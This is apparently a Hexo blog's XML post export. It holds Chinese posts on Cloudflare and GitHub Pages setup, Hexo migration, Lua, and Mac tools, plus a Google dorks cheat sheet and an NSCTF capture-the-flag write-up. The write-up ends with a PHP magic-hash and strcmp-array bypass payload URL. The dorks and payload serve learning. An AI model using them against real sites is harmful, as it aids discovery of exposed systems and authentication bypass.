<p><strong>注意</strong>：禁用 HTTP&#x2F;DNS 代理可能会干扰其他云服务。如果你的网站中有使用其他 Cloudflare 服务，这些服务有可能会冲突失效。</p>
<p>如果您仍要继续，您可以按照以下说明操作：</p>
<p>首先，请确保您已根据我们的帮助文档中的说明在 Cloudflare 中设置了 DNS 记录：</p>
<p><a href="https://help.github.com/articles/using-a-custom-domain-with-github-pages">https://help.github.com/articles/using-a-custom-domain-with-github-pages</a></p>
<p>要禁用 CloudFlare 的 DNS&#x2F;HTTP 代理，您需要登录到 CloudFlare 帐户，导航到域的 DNS 设置页面，然后单击与 GitHub Pages 域相关的任何 DNS 记录旁边的橙色云图标。正确禁用云图标时，应变为灰色。</p>
<p>如下图所示：</p>
<p><img src="/posts/b1adab59/image-20200608142915112.png" alt="image-20200608142915112"></p>
<p>这些 DNS 更改最多可能需要 72 小时才能在互联网上传播。完成操作后，您需要通过访问存储库的设置页面来触发对 DNS 设置的重新检查。这将启动为域名预配 HTTPS 证书的过程。</p>
<p>预配证书后，您可以通过选中”强制 HTTPS”复选框来强制执行 HTTPS。</p>
<p>请记住，请求 HTTPS 证书可能需要一个小时左右的时间，因此，如果您按照这些步骤执行这些步骤但仍有问题，这通常是原因。</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>github pages</tag>
        <tag>自定义域名</tag>
        <tag>cloudflare</tag>
      </tags>
  </entry>
  <entry>
    <title>Google Dorks/Google Hacking/Google Keywords</title>
    <url>/posts/5f79c4f5.html</url>
    <content><![CDATA[<p>使用Google的一些姿势</p>
<span id="more"></span>

<h2 id="Google-Keywords"><a href="#Google-Keywords" class="headerlink" title="Google Keywords"></a>Google Keywords</h2><h3 id="标点和符号"><a href="#标点和符号" class="headerlink" title="标点和符号"></a>标点和符号</h3><table>
<thead>
<tr>
<th><strong>operator</strong></th>
<th>含义</th>
<th>例子</th>
</tr>
</thead>
<tbody><tr>
<td><code>+</code></td>
<td>Search for Google+ pages or blood types</td>
<td>+Chrome or AB+</td>
</tr>
<tr>
<td><code>@</code></td>
<td>Find social tags</td>
<td>@agoogler</td>
</tr>
<tr>
<td><code>$</code></td>
<td>Find prices</td>
<td>nikon $400</td>
</tr>
<tr>
<td><code>#</code></td>
<td>Find popular hashtags for trending topics</td>
<td>#throwbackthursday</td>
</tr>
<tr>
<td><code>-</code></td>
<td>Exclude web-pages with specified words or site</td>
<td>Examples: jaguar speed -car or pandas -site:wikipedia.org</td>
</tr>
<tr>
<td><code>&quot;</code></td>
<td>When you put a word or phrase in quotes, the results will only include pages with the same words in the same order as the ones inside the quotes</td>
<td>“imagine all the people”</td>
</tr>
<tr>
<td><code>.</code></td>
<td>Any symbol</td>
<td></td>
</tr>
<tr>
<td><code>*</code></td>
<td>Any text</td>
<td>“a * saved is a * earned”</td>
</tr>
<tr>
<td><code>..</code></td>
<td>Number range</td>
<td>camera $50..$100</td>
</tr>
</tbody></table>
<h3 id="搜索运算符"><a href="#搜索运算符" class="headerlink" title="搜索运算符"></a>搜索运算符</h3><table>
<thead>
<tr>
<th>operator</th>
<th>meaning</th>
<th>examples</th>
</tr>
</thead>
<tbody><tr>
<td>site:</td>
<td>Get results from certain sites or domains</td>
<td>olympics site:nbc.com and olympics site:.gov</td>
</tr>
<tr>
<td>inurl:</td>
<td>Get results with specified word in uri (searches after site name)</td>
<td>inurl:news</td>
</tr>
<tr>
<td>IP:</td>
<td>(<em>bing</em> and <em>yahoo</em>) Search by IP-address</td>
<td>IP:88.198.55.240</td>
</tr>
<tr>
<td>intext:</td>
<td>Search in web-page body</td>
<td>intext:passwd</td>
</tr>
<tr>
<td>intitle:</td>
<td>Search in web-page title tag</td>
<td>intitle:”index of”</td>
</tr>
<tr>
<td>ext: &#x2F; filetype:</td>
<td>Search pages with special extension</td>
<td>ext:pdf</td>
</tr>
<tr>
<td>related:</td>
<td>Find sites that are similar to a web address you already know</td>
<td>related:time.com</td>
</tr>
<tr>
<td>link:</td>
<td>Search sites refering to specified site</td>
<td>link:wikipedia.com</td>
</tr>
<tr>
<td>OR</td>
<td>Find pages that might use one of several words</td>
<td>marathon OR race</td>
</tr>
<tr>
<td>info:</td>
<td>Get information about a web address, including the cached version of the page, similar pages, and pages that link to the site</td>
<td>info:google.com</td>
</tr>
<tr>
<td>cache:</td>
<td>See what a page looks like the last time Google visited the site</td>
<td>cache:washington.edu</td>
</tr>
<tr>
<td>define:</td>
<td>Show definition of term</td>
<td>define:0day</td>
</tr>
</tbody></table>
<h3 id="工控设备Google-Dorks"><a href="#工控设备Google-Dorks" class="headerlink" title="工控设备Google Dorks"></a>工控设备Google Dorks</h3><p>工控设备产品不仅可以通过网络空间搜索引擎如shadon，zoomeye，fofa等进行查找，也可以利用传统搜索引擎。以Google为例，每个特定的工控设备产品都具有单独的Google dorks，可以使用这个进行设备检索。</p>
<p>以下是一些关于工控设备SCADA系统的Google Dorks列表。</p>
<p><img src="/posts/5f79c4f5/2874093212.png" alt="img"></p>
<h2 id="GHDB-x2F-SHDB"><a href="#GHDB-x2F-SHDB" class="headerlink" title="GHDB&#x2F;SHDB"></a>GHDB&#x2F;SHDB</h2><p>Google Hacking Database(GHDB)&#x2F;Search Hacking Database(SHDB)&#x2F;Google Dorks&#x2F;搜索引擎黑客数据库</p>
<p><a href="https://www.uedbox.com/shdb/">https://www.uedbox.com/shdb/</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.key1.top/index.php/archives/343/">https://www.key1.top/index.php/archives/343/</a></p>
<p><a href="https://www.uedbox.com/post/64032/">https://www.uedbox.com/post/64032/</a></p>
]]></content>
      <categories>
        <category>神兵利器</category>
      </categories>
      <tags>
        <tag>Google Hacking</tag>
        <tag>Google Dorks</tag>
        <tag>Google Keywords</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客迁移小记</title>
    <url>/posts/253f8523.html</url>
    <content><![CDATA[<p>黑苹果的500g硬盘容量不够了，主要是因为装好多虚拟机（哭</p>
<p>故重回windows10怀抱，下面写下步骤，遇到的问题及解决方案。</p>
<span id="more"></span>

<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="第一步，拷贝原来的文件"><a href="#第一步，拷贝原来的文件" class="headerlink" title="第一步，拷贝原来的文件"></a>第一步，拷贝原来的文件</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">需要拷贝的文件及文件夹如下所示：</span><br><span class="line">source</span><br><span class="line">themes</span><br><span class="line">_config.yml</span><br></pre></td></tr></table></figure>

<p><img src="/posts/253f8523/image-20201129175236497.png" alt="image-20201129175236497"></p>
<p>可以用U盘拷贝到其他位置备用</p>
<h3 id="第二步，建立新的依赖环境"><a href="#第二步，建立新的依赖环境" class="headerlink" title="第二步，建立新的依赖环境"></a>第二步，建立新的依赖环境</h3><p>步骤与新建hexo博客一样的，大致如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">需要安装的有：</span><br><span class="line">nodejs</span><br><span class="line">git</span><br><span class="line">hexo</span><br></pre></td></tr></table></figure>

<p>安装步骤不再细说，网上教程一搜就有（逃</p>
<p>接着新建文件夹进行初始化，本例为D:&#x2F;blog</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化hexo</span></span><br><span class="line">hexo init</span><br><span class="line"><span class="comment"># 初始化git</span></span><br><span class="line">git init</span><br></pre></td></tr></table></figure>

<p>完成后的目录结构如下图所示：</p>
<p><img src="/posts/253f8523/image-20201129180218814.png" alt="image-20201129180218814"></p>
<p>安装完git之后要做以下操作：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">配置github的ssh密钥</span><br><span class="line">设置git提交信息</span><br></pre></td></tr></table></figure>

<p>可参考：<a href="https://blog.csdn.net/qq_29726869/article/details/88622840">https://blog.csdn.net/qq_29726869/article/details/88622840</a></p>
<h2 id="第三步，覆盖文件"><a href="#第三步，覆盖文件" class="headerlink" title="第三步，覆盖文件"></a>第三步，覆盖文件</h2><p>将第一步备份的文件进行覆盖</p>
<p>右键git bash here</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>浏览器访问127.0.0.1:4000就可以看到效果啦</p>
<hr>
<p><strong>注意：若出现图片无法正常显示或其他问题，很大可能是因为插件不全导致，需要根据package.json文件内容，安装插件</strong></p>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br><span class="line">npm install hexo-baidu-url-submit --save</span><br><span class="line">npm install hexo-blog-encrypt --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-generator-baidu-sitemap --save</span><br><span class="line">npm install hexo-generator-feed --save</span><br><span class="line">npm install hexo-generator-searchdb --save</span><br><span class="line">npm install hexo-generator-sitemap --save</span><br><span class="line">npm install hexo-git-backup --save</span><br><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure>

<h2 id="遇到的问题及解决方案"><a href="#遇到的问题及解决方案" class="headerlink" title="遇到的问题及解决方案"></a>遇到的问题及解决方案</h2><h3 id="Q1"><a href="#Q1" class="headerlink" title="Q1:"></a>Q1:</h3><p>hexo s之后出现Validating config?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INFO  Validating config</span><br><span class="line">WARN  Deprecated config detected: &quot;use_date_for_updated&quot; is deprecated, please use &quot;updated_option&quot; instead. See https://hexo.io/docs/configuration for more details.</span><br></pre></td></tr></table></figure>

<h3 id="A1"><a href="#A1" class="headerlink" title="A1:"></a>A1:</h3><p>修改_config.yml一行内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use_date_for_updated: true # deprecated</span><br><span class="line">updated_option: date # use this</span><br></pre></td></tr></table></figure>

<p>可参考：<a href="https://github.com/hexojs/hexo/issues/4450">https://github.com/hexojs/hexo/issues/4450</a></p>
<h3 id="Q2："><a href="#Q2：" class="headerlink" title="Q2："></a>Q2：</h3><p>浏览器访问出现</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;_layout.swig&#x27; %&#125; &#123;% import &#x27;_macro/post.swig&#x27; as post_template %&#125; &#123;% import &#x27;_macro/sidebar.swig&#x27; as sidebar_template %&#125; &#123;% block title %&#125;&#123;&#123; config.title &#125;&#125;&#123;% if theme.index_with_subtitle and...</span><br></pre></td></tr></table></figure>

<p>如下图所示：</p>
<p><img src="/posts/253f8523/image-20201129181048024.png" alt="image-20201129181048024"></p>
<h3 id="A2："><a href="#A2：" class="headerlink" title="A2："></a>A2：</h3><p>是因为Hexo 5将swig渲染插件移除造成</p>
<p>解决办法，手动安装即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure>

<p>可参考：<a href="https://github.com/ahonn/hexo-theme-even/issues/266">https://github.com/ahonn/hexo-theme-even/issues/266</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面两个问题都是hexo版本更新造成的，如果迁移前后hexo版本一致，就不再需要看上面的解决方案啦。</p>
<p>遇到问题可以多看看官方文档README.md还有issues，可以更快解决哦！</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>博客迁移</tag>
        <tag>2020</tag>
      </tags>
  </entry>
  <entry>
    <title>Lua开发环境搭建 for mac</title>
    <url>/posts/812b3f7e.html</url>
    <content><![CDATA[<h4 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h4><blockquote>
<p>&amp;emsp;&amp;emsp;Lua是一种用C语言编写的可扩展，轻量级的编程语言。它于1993年由Roberto Ierusalimschy，Luiz Henrique de Figueiredo和Waldemar Celes作为内部项目开始研发。</p>
</blockquote>
<span id="more"></span>

<h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>通过源码安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -R -O http://www.lua.org/ftp/lua-5.3.0.tar.gz</span><br><span class="line">tar zxf lua-5.3.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> lua-5.3.0</span><br><span class="line">make macosx <span class="built_in">test</span></span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>成功截图</p>
<p><img src="/posts/812b3f7e/sc_20200603193218.png" alt="img"></p>
<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>通过HomeBrew（版本管理很方便）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搜索可用版本</span></span><br><span class="line">brew search lua</span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">brew install lua</span><br></pre></td></tr></table></figure>

<p><img src="/posts/812b3f7e/sc_20200603192839.png" alt="img"></p>
<h4 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建</span></span><br><span class="line">vim HelloWorld.lua</span><br><span class="line"><span class="comment"># 输入</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">lua HelloWorld.lua</span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure>

<p>运行截图</p>
<p><img src="/posts/812b3f7e/image-20200603193609668.png" alt="image-20200603193609668"></p>
]]></content>
      <categories>
        <category>语言学习</category>
      </categories>
      <tags>
        <tag>Develop</tag>
        <tag>lua</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac OS装机系列小记</title>
    <url>/posts/51ac3858.html</url>
    <content><![CDATA[<p>记录下mac os平台好用的软件&#x2F;工具&#x2F;操作，方便下次黑苹果环境搭建</p>
<h3 id="黑苹果安装"><a href="#黑苹果安装" class="headerlink" title="黑苹果安装"></a>黑苹果安装</h3><h4 id="远景论坛"><a href="#远景论坛" class="headerlink" title="远景论坛"></a>远景论坛</h4><p><a href="http://bbs.pcbeta.com/">http://bbs.pcbeta.com/</a></p>
<h4 id="黑果小兵"><a href="#黑果小兵" class="headerlink" title="黑果小兵"></a>黑果小兵</h4><p><a href="https://blog.daliansky.net/">https://blog.daliansky.net/</a></p>
<h4 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h4><p><a href="https://github.com/">https://github.com</a></p>
<p>待续~</p>
<h3 id="资源推荐"><a href="#资源推荐" class="headerlink" title="资源推荐"></a>资源推荐</h3><h4 id="腾讯柠檬精选"><a href="#腾讯柠檬精选" class="headerlink" title="腾讯柠檬精选"></a>腾讯柠檬精选</h4><p><a href="https://lemon.qq.com/lab/">https://lemon.qq.com/lab/</a></p>
<p>腾讯出品，收录了一些正版、好用的Mac产品</p>
<p>质量不错，有点评，并不是全免费</p>
<h4 id="MacWk"><a href="#MacWk" class="headerlink" title="MacWk"></a>MacWk</h4><p><a href="https://macwk.com/">https://macwk.com/</a></p>
<p>更新快，有特殊软件，适合学生党</p>
<p>榜单，专题，专题必备做的都很不错</p>
<h3 id="软件推荐"><a href="#软件推荐" class="headerlink" title="软件推荐"></a>软件推荐</h3><h4 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h4><p>多版本python环境必备</p>
<h4 id="proxychain"><a href="#proxychain" class="headerlink" title="proxychain"></a>proxychain</h4><p>终端代理神器，可以配合v2ray</p>
<h4 id="FinalShell"><a href="#FinalShell" class="headerlink" title="FinalShell"></a>FinalShell</h4><p>管理云服务器好用，支持ssh代理隧道</p>
<h4 id="ChashX"><a href="#ChashX" class="headerlink" title="ChashX"></a>ChashX</h4><p>V2ray是mac平台目前最好用的代理客户端，没有之一</p>
<p>支持订阅导入，自动更新；支持PAC模式，规则判断</p>
<h4 id="HandShaker"><a href="#HandShaker" class="headerlink" title="HandShaker"></a>HandShaker</h4><p>锤子出品的，用来链接安卓手机</p>
<h4 id="护眼宝"><a href="#护眼宝" class="headerlink" title="护眼宝"></a>护眼宝</h4><p>太真实了，程序猿刚需，个人感觉还是有点用的</p>
<h4 id="Navicat"><a href="#Navicat" class="headerlink" title="Navicat"></a>Navicat</h4><p>数据库图形化管理神器</p>
<h4 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h4><p>markdown写作利器，导入导出功能强大，所见即所得</p>
<h4 id="腾讯柠檬清理"><a href="#腾讯柠檬清理" class="headerlink" title="腾讯柠檬清理"></a>腾讯柠檬清理</h4><p>除了清理释放内存、垃圾，还可以对摄像头、麦克风隐私保护</p>
<h4 id="TotalFinder"><a href="#TotalFinder" class="headerlink" title="TotalFinder"></a>TotalFinder</h4><p>扩展Finder实现类似windows资源管理器，可多标签窗口</p>
<h4 id="Downie-4"><a href="#Downie-4" class="headerlink" title="Downie 4"></a>Downie 4</h4><p>图形化界面的视频下载器，可自定义提取，比you-get更容易上手</p>
<p>未完，待续~</p>
]]></content>
      <categories>
        <category>折腾搞机</category>
      </categories>
      <tags>
        <tag>Mac os</tag>
        <tag>软件推荐</tag>
        <tag>黑苹果安装</tag>
      </tags>
  </entry>
  <entry>
    <title>NSCTF测试平台WriteUp</title>
    <url>/posts/ee2eca3f.html</url>
    <content><![CDATA[<p>做了一些题目，简单记录下</p>
<span id="more"></span>

<h3 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h3><h4 id="Crackme"><a href="#Crackme" class="headerlink" title="Crackme"></a>Crackme</h4><p>密码就是flag，jeb反编译分析就可得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/6/29</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">str1 = <span class="string">&quot;miaomiao!&quot;</span></span><br><span class="line">s2 = [<span class="number">23</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">17</span>, <span class="number">7</span>, <span class="number">90</span>, <span class="number">20</span>]</span><br><span class="line">flag1 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">	flag1+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(str1[i]) ^ s2[i])</span><br><span class="line">	<span class="built_in">print</span> flag1</span><br><span class="line"></span><br><span class="line">dic=[<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">                m=<span class="string">&#x27;27a3c22d01eb&#x27;</span>+dic[a]+dic[b]+dic[c]+<span class="string">&#x27;6ee8866aa5e5e7820&#x27;</span></span><br><span class="line">                flag=hashlib.md5()</span><br><span class="line">                flag.update(m)</span><br><span class="line">                md5=flag.hexdigest()</span><br><span class="line">                <span class="keyword">if</span> md5==<span class="string">&#x27;271373f323d9f76dc31204ff19823fdf&#x27;</span>:</span><br><span class="line">                            <span class="built_in">print</span> m</span><br><span class="line">                            <span class="built_in">print</span> md5</span><br></pre></td></tr></table></figure>



<h3 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h3><h4 id="美国队长"><a href="#美国队长" class="headerlink" title="美国队长"></a>美国队长</h4><p>分析可以发现关键是在sub_401000()这个函数</p>
<p><img src="/posts/ee2eca3f/image-20200628165839127.png" alt="image-20200628165839127"></p>
<p>异或拼接就是flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/6/29</span></span><br><span class="line">a = <span class="string">&#x27;7e0cad17016b0&gt;?45?f7c&gt;0&gt;4a&gt;1c3a0&#x27;</span></span><br><span class="line">flag_q = <span class="string">&#x27;flag:&#123;NSCTF_md5&#x27;</span></span><br><span class="line">flag_h = <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">	flag_q+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i]) ^ <span class="number">0x7</span>)</span><br><span class="line"><span class="built_in">print</span> flag_q + flag_h</span><br></pre></td></tr></table></figure>



<h4 id="re"><a href="#re" class="headerlink" title="re"></a>re</h4><p>IDA64载入</p>
<p>查看main函数 分析如下图所示</p>
<p><img src="/posts/ee2eca3f/image-20200628163755607.png" alt="image-20200628163755607"></p>
<p>dwfsxe::dwfsxe函数与handvfiu::handvfiu函数可以得到两个字符串</p>
<p><img src="/posts/ee2eca3f/image-20200628164216271.png" alt="image-20200628164216271"></p>
<blockquote>
<p>m &#x3D; ‘0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&amp;*()_+’</p>
</blockquote>
<p><img src="/posts/ee2eca3f/image-20200628164247411.png" alt="image-20200628164247411"></p>
<blockquote>
<p>enc &#x3D; ‘hP&amp;p0!5L^#3NXLs@*QR%L&amp;UN!L)0%Q^’ </p>
</blockquote>
<p>最后在B::cewrwe23rf这个函数进行比较</p>
<p><img src="/posts/ee2eca3f/image-20200628162337609.png" alt="image-20200628162337609"></p>
<p>动态调试可以分析出</p>
<p><img src="/posts/ee2eca3f/sc_20200628155055.png" alt="sc_20200628155055"></p>
<p>总结就是</p>
<ol>
<li>我们输入的字符串长度 &#x3D; 31</li>
</ol>
<p>即len(flag) &#x3D; 31</p>
<ol start="2">
<li>字符串每一位 - 0x30 &#x3D; 下标(下边这个表)</li>
</ol>
<p>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&amp;*()_+</p>
<ol start="3">
<li>下标对应的位置的字符 需要等于 这串字符中的hP&amp;p0!5L^#3NXLs@*QR%L&amp;UN!L)0%Q^</li>
</ol>
<p>逆推一下就可以得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/6/29</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_1</span>(<span class="params">str1, num1</span>):</span><br><span class="line">	test_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">		test_str+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(str1[i]) ^ num1)</span><br><span class="line">	<span class="keyword">return</span> base64.b64decode(test_str)</span><br><span class="line"></span><br><span class="line">test_str1 = <span class="string">&#x27;OFG&#123;OxS3Lha6MUDk[0PnXofmcUrp`E3w`1@zalL2fZX1gJn4SWHFPGTEP2jHQivOVW7RWDDQW3PTTnf[UTmjSAOiHT6oIkerZ&#123;q?&#x27;</span></span><br><span class="line">test_str2 = <span class="string">&#x27;bEBn`GBkMV&#123;fJyMLTF&#123;yR@sQVjUNIoULJVtsN@UQ[d&gt;&gt;&#x27;</span></span><br><span class="line">m = decode_1(test_str1, <span class="number">2</span>)</span><br><span class="line">enc = decode_1(test_str2, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">		<span class="keyword">if</span> enc[i]==m[j]:</span><br><span class="line">			flag+=<span class="built_in">chr</span>(j+<span class="number">0x30</span>)</span><br><span class="line">			<span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Dream-II"><a href="#Dream-II" class="headerlink" title="Dream II"></a>Dream II</h4><p>根据提示 burpsuit发送内容是message的put请求  </p>
<p>就可以得到一串字符</p>
<p>base64解码就是flag</p>
<p><img src="/posts/ee2eca3f/image-20200701131334140.png" alt="image-20200701131334140"></p>
<h4 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h4><p>F12查看源代码可以看到flag前半段</p>
<p><img src="/posts/ee2eca3f/image-20200701131817721.png" alt="image-20200701131817721"></p>
<p>抓包可以在响应头发现后半段 拼接就是flag</p>
<p><img src="/posts/ee2eca3f/image-20200701131903070.png" alt="image-20200701131903070"></p>
<h4 id="Code-Php"><a href="#Code-Php" class="headerlink" title="Code Php"></a>Code Php</h4><p>F12查看源代码可以看到注释有code.txt</p>
<p><img src="/posts/ee2eca3f/image-20200701132208873.png" alt="image-20200701132208873"></p>
<p>访问得到php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>审计代码可以发现 题目考察两个点</p>
<ul>
<li><p>php在进行比较时如果遇到”0e”开头的字符串，会当成科学技术法，因为0的不管多少次方都是0，也就造成了hash比较缺陷</p>
</li>
<li><p>strcmp函数只会处理字符串类型参数，如果是数组的话，就会返回NULL,而判断使用的是&#x3D;&#x3D;，NULL&#x3D;&#x3D;0为真</p>
</li>
</ul>
<p>由此可以构造Payload</p>
<ul>
<li><p><a href="http://192.144.182.32:8001/abf20c91a442da48/3/?v1=240610708&amp;v2=QNKCDZO&amp;v3%5B%5D=">http://192.144.182.32:8001/abf20c91a442da48/3/?v1=240610708&amp;v2=QNKCDZO&amp;v3[]=</a></p>
</li>
